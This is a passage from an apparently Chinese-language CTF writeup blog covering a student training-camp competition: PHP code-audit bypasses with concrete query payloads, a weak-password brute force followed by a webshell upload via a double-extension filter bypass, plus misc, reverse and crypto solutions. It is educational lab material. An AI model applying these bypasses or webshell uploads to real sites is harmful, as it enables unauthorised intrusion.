class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUblJXYTFwUFZsZFNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">asdfiohaefho;</span><br><span class="line">$_ &#x3D; preg_replace(&quot;&#x2F;c#%bbuh;!_&amp;%ls@asc%bbzfd&#x2F;s&quot;, &#39;p&#39;, $_);</span><br><span class="line">$_ &#x3D; preg_replace(&quot;&#x2F;lhuh;!_&amp;%l@das%dbuioowed&#x2F;s&quot;, &#39;h&#39;, $_);</span><br><span class="line">$_ &#x3D; preg_replace(&quot;&#x2F;&amp;\)buh;!_&amp;%l@as%bagsdepkl&#x2F;s&quot;, &#39;p&#39;, $_);</span><br><span class="line">$__ &#x3D; explode(&quot;\n&quot;, $_);</span><br><span class="line">echo count($__);</span><br><span class="line">foreach ($__ as $____ &#x3D;&gt; $_____) </span><br><span class="line">    &#123;</span><br><span class="line">        for($_qpalzmxncbvsjdhfgryeuwi&#x3D;0;$_qpalzmxncbvsjdhfgryeuwi&lt;10;$_qpalzmxncbvsjdhfgryeuwi++)</span><br><span class="line">        &#123;$_____ &#x3D; base64_decode($_____);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>看到好像还是很乱很多，其实仔细一看也挺简单的，就是对一大串字符串处理</p>
+<p>本地测试一下让它输出变量试试，发现只有放到下图这样才会输出少量东西，其它好像都不太像flag</p>
+<p><img src="/2019/08/15/drops-new-2019/20190810182541.png"></p>
+<p>这个像不像常见的置换密码，试了试是ROT13加密</p>
+<pre><code>flag&#123;php_is_the_best_language&#125;</code></pre>
+<h3 id="Hi-WALLE"><a href="#Hi-WALLE" class="headerlink" title="Hi~WALLE"></a>Hi~WALLE</h3><p>拿到题目是这样的：</p>
+<p><img src="/2019/08/15/drops-new-2019/20190810183622.png"></p>
+<p>dirseach一扫，发现<code>robots.txt</code></p>
+<p>访问一看，有个隐藏目录，<code>/easy_challenge/web/dropsec/shell</code></p>
+<p>访问隐藏目录，提示flag不在这里</p>
+<p>用工具再扫一下这个目录吧，有个<code>shell.php</code>,访问出现点我有惊喜提示，方向好像对了，再点开，最坑爹的地方来了，也是这个地方让我知道为啥有代打出题人业务了，一把心酸泪啊</p>
+<p><img src="/2019/08/15/drops-new-2019/20190810184641.png"></p>
+<p>仔细观察，发现有什么不同没？</p>
+<p><code>dr0psec</code> <code>drOpsec</code></p>
+<p>一个是0，一个是O,它让我们传一个参数，刚开始一直是Url上那个参数，一直没进展</p>
+<p>换成dr0psec随便输个1，发现提示<code>too small</code>,输个10000 提示<code>too big</code></p>
+<p>很明显bp爆破就行，当=2333时有flag</p>
+<pre><code>flag&#123;l0ve_walle_robots&#125;</code></pre>
+<h3 id="easy-audit1"><a href="#easy-audit1" class="headerlink" title="easy audit1"></a>easy audit1</h3><p>拿到题目是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if(empty($_GET)) </span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(&quot;get get get get args&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$a1&#x3D;$_GET[&#39;a1&#39;];</span><br><span class="line">$a2&#x3D;$_GET[&#39;a2&#39;];</span><br><span class="line">$a3&#x3D;$_GET[&#39;a3&#39;];</span><br><span class="line">$a4&#x3D;$_GET[&#39;a4&#39;];</span><br><span class="line">$obstacle_1&#x3D;is_numeric($a2) and is_numeric($a1);</span><br><span class="line">if(!$obstacle_1) exit(&quot;foolish&quot;);</span><br><span class="line"></span><br><span class="line">if(!(intval($a2)&lt;1024 and intval($a2+1)&gt;1024)) exit(&quot;emmmmm&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($a1))</span><br><span class="line">&#123;</span><br><span class="line">    $secret&#x3D;hash_hmac(&#39;sha256&#39;,$a1,$secret);</span><br><span class="line">&#125;</span><br><span class="line">$hmac&#x3D;hash_hmac(sha256,$a2,$secret);</span><br><span class="line">if($a3!&#x3D;&#x3D;$hmac)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    die(&quot;OMG&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;give you flag: &quot;.$flag;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">get get get get args</span><br></pre></td></tr></table></figure>
+
+<p>显然是一道代码审计题，我们要做的就是怎样绕过</p>
+<p>观察题目发现可以传4个参数，GET方式</p>
+<p>并且a1,a2要为数字</p>
+<p>如果有两个is_numeric判断的时候用and连接起来，and后面的is_numberic判断可忽略</p>
+<p>还要<code>intval($a2)&lt;1024 and intval($a2+1)&gt;1024</code>，这里的intval() 函数用于获取变量的整数值，可以用16进制或者科学记数法进行绕过</p>
+<p>intval(字符串)为0，intval(字符串+1) 会自动转换成数值的，事实上是字符串和数字运算时发生了转换</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a2&#x3D;&#39;1e9&#39;;</span><br><span class="line">echo intval($a2);#输出1</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo intval($a2+1);#输出100000001</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo $a2+1;#输出100000001</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>hash_hmac()函数是生成带有密钥的哈希值，有三个参数，如果传入加密的字符串为数组，函数将返回空字符串，就可以通过控制a1的值，我们可以让$secret为空，那么$hmac就可以控制了</p>
+<p>cmd本地测试一下算下$a2用sha256算法加密后的结果，这里$a2取1e5,注意$a2要为字符串类型，即加上单引号或双引号</p>
+<pre><code>e6f66665054a43d574b8c3fb1599d6cbbc8760191d270428f2213b000f16b7e6</code></pre>
+<p><img src="/2019/08/15/drops-new-2019/20190812224837.png"></p>
+<pre><code>payload1:
+?a1[]=1&amp;a2=1e5&amp;a3=e6f66665054a43d574b8c3fb1599d6cbbc8760191d270428f2213b000f16b7e6</code></pre>
+<p>当然a1也可以不为数组</p>
+<pre><code>payload2:
+?a1=1&amp;a2=1e5&amp;a3=4dd2fa37e9fe33eccec13b3adcfc9c0d86e074c8e369d9d9d9db00a2c0c75ca3
+
+flag&#123;didhfahffdjhcj38ash8y&#125;</code></pre>
+<h3 id="easy-audit2"><a href="#easy-audit2" class="headerlink" title="easy audit2"></a>easy audit2</h3><p>打开题目又是道代码审计题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#39;flag.php&#39;);</span><br><span class="line">$flag &#x3D; &#39;xxxxxxxxxxxxxx&#39;;</span><br><span class="line">foreach ($_POST as $key &#x3D;&gt; $value) &#123;</span><br><span class="line">    $a &#x3D; $value;</span><br><span class="line">    $$$key&#x3D;$value;</span><br><span class="line">    $ccut &#x3D; $flag;</span><br><span class="line">    $yml &#x3D; $_GET[&quot;flag&quot;];</span><br><span class="line">    if ($yml &#x3D;&#x3D; &quot;iwantflag&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($ccut &#x3D;&#x3D; &quot;flag&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            echo $fl4g;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;you will get it&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;nonono&quot;;</span><br><span class="line">    &#125;    </span><br><span class="line">    # code...</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);   </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>仔细看看，这道题的意思就是把POST过来的数组键值遍历，GET接收一个flag的参数</p>
+<p>输出flag的方式就是让GET方式提交的参数flag为<code>’iwantflag’</code>，$ccut为’flag’,而<code>$ccut = $flag</code>,所以就转变成让<code>$flag=’flag’</code>的问题了，这里我也不绕弯了，首先要了解php可变变量的概念,具体百度</p>
+<p><img src="/2019/08/15/drops-new-2019/20190812233048.png"></p>
+<p>payload：</p>
+<pre><code>GET:?flag=iwantflag
+POST:a=flag
+解释一下，当POST过去a=flag时$key=’a’,$value=’flag’,又因为$a = $value，则$a=’flag’,$$$key=$$a=$flag=$value=’flag’,构造成功
+
+
+flag&#123;Varivables-are-covered-MX&#125;</code></pre>
+<h3 id="loginlogin"><a href="#loginlogin" class="headerlink" title="loginlogin"></a>loginlogin</h3><p>拿到题目是个登录界面：</p>
+<p><img src="/2019/08/15/drops-new-2019/20190812233404.png"></p>
+<p>bp抓包，看到这个提示，意思是说初始账号密码分别为<code>dropsec_admin</code>，<code>123456</code></p>
+<p><img src="/2019/08/15/drops-new-2019/20190812233631.png"></p>
+<p>尝试用这个登陆，发现根本没反应，由此我们想可能是个假的登陆页面，dirsearch扫下吧，发现了<code>login.php</code>,访问一下，是个GET方式的登陆，感觉好low，尝试用默认账号密码登陆，提示<code>login failed</code>，bp爆破一下弱口令吧,管理员账号应该不会改，这里选择password这个字典</p>
+<p><img src="/2019/08/15/drops-new-2019/20190812234618.png"></p>
+<p>密码为ADMIN</p>
+<p><img src="/2019/08/15/drops-new-2019/20190812234732.png"></p>
+<p>登陆进去发现好像又变成考察文件上传了，并且提示只能上传jpg文件</p>
+<p>先上传个一句话试试，bp抓下包，改下MIME(Content-Type)</p>
+<p><img src="/2019/08/15/drops-new-2019/20190813000235.png"></p>
+<p>发现提示：服务器把php扩展名替换成空了</p>
+<p><img src="/2019/08/15/drops-new-2019/20190813000357.png"></p>
+<p>我们想到双写绕过，直接再bp里改，注意php双写绕过只有<code>.pphphp</code>一种方式</p>
+<p><img src="/2019/08/15/drops-new-2019/20190813000739.png"></p>
+<pre><code>flag&#123;dont_do_things_carelessly&#125;</code></pre>
+<h3 id="ji-ni-tai-mei"><a href="#ji-ni-tai-mei" class="headerlink" title="ji ni tai mei!"></a>ji ni tai mei!</h3><p>发现上次新生赛的题还没删除，就写一下wp吧</p>
+<p>打开题目是这样的</p>
+<p><img src="/2019/08/15/drops-new-2019/20190813145734.png"></p>
+<p>bp抓包看下吧，好像没什么提示，dirseach扫下，发现有个index.php,但是跳转到flag1.php了，再抓包来看下吧</p>
+<p><img src="/2019/08/15/drops-new-2019/20190813150033.png"></p>
+<p>发现提示：<code>flag200.php</code>，访问下发现还是和<code>flag1.php</code>一样，试着k，发现就403了，而200之前的好像都存在，bp爆破一下吧</p>
+<p><img src="/2019/08/15/drops-new-2019/20190813150447.png"></p>
+<p><code>flag157.php</code>的长度显然不同，看下响应头，flag到手</p>
+<pre><code>flag&#123;really_beaut1ful~&#125;</code></pre>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="The-Wonderful-Wizard"><a href="#The-Wonderful-Wizard" class="headerlink" title="The Wonderful Wizard"></a>The Wonderful Wizard</h3><p>Stegsolve打开，切换一下，可以看到flag,是16进制的转成字符就行</p>
+<h3 id="easy-image"><a href="#easy-image" class="headerlink" title="easy image"></a>easy image</h3><p>扫描二维码</p>
+<h3 id="神奇的压缩包"><a href="#神奇的压缩包" class="headerlink" title="神奇的压缩包"></a>神奇的压缩包</h3><p>本题源自bugku杂项神秘的文件，做题方法是明文攻击</p>
+<p>解压题目，发现有flag.zip和logo.png两个文件，并且flag.zip是加密的，里面有也有两个文件，一个docx文件和logo.png</p>
+<p><img src="/2019/08/15/drops-new-2019/20190809225716.png"></p>
+<p>这时我们想到了明文攻击，将logo.png添加到压缩文件，然后就用到ARCHPR了，注意，请注意CRC一定要相同才能用ARCHPR明文攻击，否则会报错(第二张图)：</p>
+<p><img src="/2019/08/15/drops-new-2019/20190809230550.png"></p>
+<p><img src="/2019/08/15/drops-new-2019/20190809230834.png"></p>
+<p>爆破结果出来</p>
+<p><img src="/2019/08/15/drops-new-2019/20190809231341.png"></p>
+<p>输入口令解压，将docx文件拖到虚拟机binwalk分离一下，得到flag.txt,base64解码得到flag</p>
+<p><img src="/2019/08/15/drops-new-2019/20190809231906.png"></p>
+<pre><code>flag&#123;d0cX_1s_ziP_file&#125;</code></pre>
+<h3 id="放松一下"><a href="#放松一下" class="headerlink" title="放松一下"></a>放松一下</h3><p>摩斯电码</p>
+<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h3><p>用uncompyle6反编译.py文件，改下源码</p>
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p>ascci码转字符</p>
+<h3 id="Alphabet"><a href="#Alphabet" class="headerlink" title="Alphabet"></a>Alphabet</h3><p>百度一下是字母表的意思，打开之后是这样的：</p>
+<p><img src="/2019/08/15/drops-new-2019/20190810175851.png"></p>
+<p>我们可以想到前面的Alphabet应该不是加密的内容，然后后面跟了一串字符串，可以看到有{}这两个符号，前面一串是大写字母，后面是小写子母，并且{前的小写字母刚好是四个，大写字母刚为26个</p>
+<p>不扯了，这题的解法就是前面的26大写字母，分别对应着字母表的26个字母，我们要做的就是找到后面的一串小写字母在前面大写字母的序号，和真实的字母表一一对应就可以得到flag,奉上解密脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tr&#x3D;&quot;WCGPSUHRAQYKFDLZOJNXMVEBT&quot;</span><br><span class="line">secert&#x3D;&quot;ukwh&#123;ljwdhsqmags&#125;&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for s in secert:</span><br><span class="line">    if s!&#x3D;&quot;&#123;&quot; and s!&#x3D;&quot;&#125;&quot;:</span><br><span class="line">        num&#x3D;tr.index(s.upper())</span><br><span class="line">        flag+&#x3D;chr(num+ord(&quot;a&quot;))</span><br><span class="line">    else:</span><br><span class="line">        flag+&#x3D;s</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p>flag也奉上</p>
+<pre><code>flag&#123;orangejuice&#125;</code></pre>
+<h3 id="富强民主"><a href="#富强民主" class="headerlink" title="富强民主"></a>富强民主</h3><p>社会主义核心价值观解码</p>
+<h3 id="baby’s-baby-rsa"><a href="#baby’s-baby-rsa" class="headerlink" title="baby’s baby rsa"></a>baby’s baby rsa</h3><pre><code>M=Cd%n</code></pre>
+<p>套公式</p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.m00nback.xyz/2019/08/15/drops-new-2019/>http://www.m00nback.xyz/2019/08/15/drops-new-2019/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2019-10-17T13:54:00+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2019年10月17日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/writeup/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>writeup</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctf/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctf</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.m00nback.xyz/2019/08/15/drops-new-2019/&title=中原工学院Drops夏令营新生赛writeup - 明月归的小站&summary=本篇博客记录了本人参加drops攻防训练营最后的新生赛的一些writeup,很菜，勿喷！！！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.m00nback.xyz/2019/08/15/drops-new-2019/&title=中原工学院Drops夏令营新生赛writeup - 明月归的小站&summary=本篇博客记录了本人参加drops攻防训练营最后的新生赛的一些writeup,很菜，勿喷！！！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.m00nback.xyz/2019/08/15/drops-new-2019/&title=中原工学院Drops夏令营新生赛writeup - 明月归的小站&summary=本篇博客记录了本人参加drops攻防训练营最后的新生赛的一些writeup,很菜，勿喷！！！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2019/08/16/binary-coding/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>进制与编码</p>
+                <p class='content'>本篇博客主要介绍了CTF中一些常见的进制和编码方式！
+
+
+二进制二进制数据是用0和1两个数码来表示的数，当前的计算机系统使用的基本上是二进制系统。
+二进制（简称Bin)为什么用八位来表示？
+八位...</p>
+              </a>
+            
+            
+              <a class='next' href='/2019/07/22/pwn-base/'>
+                <p class='title'>pwn入门基本知识<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>本篇博客记录了学习pwn入门的一些东西，包括一些常见概念和常见漏洞及利用方法
+
+一些概念文件段：bss段：（未手动初始化的数据）并不给该段的数据分配空间，只是记录数据所需空间的大小
+
+data段...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn1"><span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn2"><span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn3"><span class="toc-text">pwn3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#chaos-file"><span class="toc-text">chaos file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hi-WALLE"><span class="toc-text">Hi~WALLE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-audit1"><span class="toc-text">easy audit1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-audit2"><span class="toc-text">easy audit2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#loginlogin"><span class="toc-text">loginlogin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ji-ni-tai-mei"><span class="toc-text">ji ni tai mei!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Wonderful-Wizard"><span class="toc-text">The Wonderful Wizard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-image"><span class="toc-text">easy image</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A5%9E%E5%A5%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-text">神奇的压缩包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BE%E6%9D%BE%E4%B8%80%E4%B8%8B"><span class="toc-text">放松一下</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#reverse2"><span class="toc-text">reverse2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome"><span class="toc-text">Welcome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Alphabet"><span class="toc-text">Alphabet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%8C%E5%BC%BA%E6%B0%91%E4%B8%BB"><span class="toc-text">富强民主</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby%E2%80%99s-baby-rsa"><span class="toc-text">baby’s baby rsa</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
